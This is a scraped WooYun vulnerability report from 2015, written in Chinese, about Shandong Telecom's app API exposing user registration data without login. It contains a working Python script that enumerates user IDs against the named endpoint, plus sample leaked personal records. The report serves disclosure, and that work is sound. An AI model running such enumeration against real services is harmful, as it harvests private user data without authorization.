{"id": 37388, "wybug_id": "wooyun-2015-099809", "wybug_title": "山东电信官方app流量银行用户注册信息泄露", "wybug_corp": "山东电信", "wybug_author": "prolog", "wybug_date": "2015-03-09 12:38", "wybug_open_date": "2015-04-23 12:40", "wybug_type": "未授权访问/权限绕过", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计不当", "手机安全"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-09：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-13：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-03-23：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-04-02：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-12：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-04-23：\t细节向公众公开  简要描述： 山东电信官方app流量银行用户注册信息泄露 详细说明：  获取用户注册信息接口在未登录情况下，可以通过userid遍历获取用户信息，接口参数仅使用base64编码，没做有效保护抓包得到接口数据http://y.adzhichuan.com/js/webcgi.php?data=eyJib2R5Ijp7InVzZXJfaWQiOi*******参数直接base64解密得到 {\"body\":{\"user_id\":\"%s\",\"check_type\":\"1\"},\"cmd\":309068038}经测试可以进行未登录下的用户信息遍历   漏洞证明：  \n#! /usr/bin/env python#coding=utf-8import urllib2,base64for i in range(100003253,100025112):    arg='{\"body\":{\"user_id\":\"%s\",\"check_type\":\"1\"},\"cmd\":309068038}' % str(i)    arg=base64.b64encode(arg)    s=urllib2.urlopen('http://y.adzhichuan.com/js/webcgi.php?data='+arg).read()    print base64.b64decode(s).decode(\"utf-8\").encode(\"gbk\")\n { \"body\": {  \"user_info\": {   \"area_code\": null,    \"change_sum_cnt\": 5,    \"cid\": \"A0000043FBF45A\",    \"idcard_no\": null,    \"idcard_type\": null,    \"inviter_id\": \"100003252\",    \"inviter_name\": null,    \"level_type\": null,    \"operator_id\": \"18906敏感3292\",    \"operator_name\": \"\",    \"reg_time\": \"2014-03-08 21:34:15\",    \"task_sum_cnt\": 160,    \"user_birthday\": \"80后\",    \"user_email\": null,    \"user_interest\": \"时尚,美食,育儿,娱乐,\",    \"user_isdn\": \"18906敏感292\",    \"user_msn\": null,    \"user_name\": null,    \"user_nation\": null,    \"user_nickname\": null,    \"user_qq\": null,    \"user_sex\": \"女\"  } }, 。。。。。。。。。。。。。。。。。   修复方案：  登录态验证，水平权限控制   版权声明：转载请注明来源 prolog@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：9  确认时间：2015-03-13 16:34 厂商回复： CNVD确认所述情况，已转由CNCERT向中国电信通报。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 9, "Ranks": null}